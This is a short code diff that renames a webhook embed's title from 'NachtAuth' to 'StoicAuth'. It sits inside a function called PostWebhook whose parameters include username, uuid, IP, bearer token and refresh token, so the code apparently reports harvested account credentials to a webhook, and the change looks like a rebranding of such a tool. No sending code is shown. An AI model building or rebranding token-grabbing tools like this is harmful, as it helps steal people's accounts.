@@ -296,7 +296,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
         content: "",
         embeds: [
             {
-                title: "NachtAuth",
+                title: "StoicAuth",
                 description: embedDescription,
                 color: 5814783,
                 fields: [
